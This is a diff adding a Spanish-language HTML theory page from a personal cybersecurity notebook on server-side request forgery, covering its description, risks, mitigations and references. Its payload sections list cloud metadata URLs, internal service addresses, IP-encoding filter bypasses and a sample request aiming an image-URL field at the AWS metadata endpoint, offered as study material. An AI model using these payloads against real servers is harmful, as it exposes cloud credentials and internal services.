@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF (Server-Side Request Forgery) - Teoría</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>SSRF (Server-Side Request Forgery)</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="dashboard.html">Máquinas Resueltas</a></li>
+                <li><a href="theory.html">Teoría</a></li>
+                <li><a href="writeup.html">Nuevo Write-up</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <article class="theory-content">
+            <section class="theory-intro">
+                <h2>Descripción Técnica</h2>
+                <p>Server-Side Request Forgery (SSRF) es una vulnerabilidad que permite a un atacante hacer que el servidor realice solicitudes HTTP a recursos internos o externos arbitrarios. Esto puede llevar a acceso a servicios internos, escaneo de red o incluso ejecución remota de código.</p>
+            </section>
+
+            <section class="theory-details">
+                <h2>Cuándo se Usa</h2>
+                <ul>
+                    <li>Aplicaciones que procesan URLs proporcionadas por el usuario</li>
+                    <li>Webhooks</li>
+                    <li>Importación de datos desde URLs</li>
+                    <li>Procesamiento de documentos</li>
+                    <li>APIs que fetch recursos externos</li>
+                </ul>
+
+                <h2>Riesgos</h2>
+                <ul>
+                    <li>Acceso a servicios internos (metadata APIs)</li>
+                    <li>Escaneo de puertos internos</li>
+                    <li>Acceso a archivos locales (file://)</li>
+                    <li>Bypass de firewalls</li>
+                    <li>Ejecución remota de código</li>
+                </ul>
+            </section>
+
+            <section class="theory-commands">
+                <h2>Payloads Comunes</h2>
+                
+                <h3>Acceso a Metadata Cloud</h3>
+                <div class="code-block">
+                    <pre><code># AWS Metadata
+http://169.254.169.254/latest/meta-data/
+
+# Google Cloud Metadata
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance</code></pre>
+                </div>
+
+                <h3>Acceso a Servicios Internos</h3>
+                <div class="code-block">
+                    <pre><code># Servicios locales
+http://localhost:22
+http://127.0.0.1:3306
+http://[::1]:5984
+
+# Red interna
+http://192.168.1.1/
+http://10.0.0.1/</code></pre>
+                </div>
+
+                <h3>Bypass de Filtros</h3>
+                <div class="code-block">
+                    <pre><code># Usar decimal/hex/octal
+http://2130706433/ (127.0.0.1)
+http://0x7f000001/ (127.0.0.1)
+
+# URL encoding
+http://127.1/
+http://127.0.0.1.xip.io
+
+# DNS rebinding
+http://rbndr.us/</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-examples">
+                <h2>Ejemplos de Laboratorio</h2>
+                
+                <h3>Entorno Seguro</h3>
+                <ul>
+                    <li>PortSwigger Web Security Academy</li>
+                    <li>VulnHub machines with SSRF</li>
+                    <li>Labs de AWS/Azure/GCP</li>
+                </ul>
+
+                <h3>Escenarios Comunes</h3>
+                <div class="code-block">
+                    <pre><code># Aplicación que procesa imágenes desde URL
+POST /process-image
+Content-Type: application/json
+
+{
+  "image_url": "http://169.254.169.254/latest/meta-data/"
+}</code></pre>
+                </div>
+            </section>
+
+            <section class="theory-mitigation">
+                <h2>Mitigaciones</h2>
+                <ul>
+                    <li>Lista blanca de dominios permitidos</li>
+                    <li>Validación estricta de URLs de entrada</li>
+                    <li>Deshabilitar redirecciones</li>
+                    <li>Usar URLs relativas cuando sea posible</li>
+                    <li>Segmentación de red</li>
+                    <li>Firewall de aplicación web</li>
+                </ul>
+            </section>
+
+            <section class="related-writeups">
+                <h2>Write-ups Relacionados</h2>
+                <div id="ssrf-writeups-list"></div>
+            </section>
+
+            <section class="theory-references">
+                <h2>Referencias</h2>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger SSRF</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank">OWASP SSRF</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP SSRF Prevention Cheat Sheet</a></li>
+                </ul>
+            </section>
+        </article>
+    </main>
+
+    <footer>
+        <p>Cuaderno Personal de Ciberseguridad &copy; 2025</p>
+        <p class="warning">Recuerda redactar información sensible antes de publicar</p>
+    </footer>
+
+    <script src="js/theory.js"></script>
+</body>
+</html>
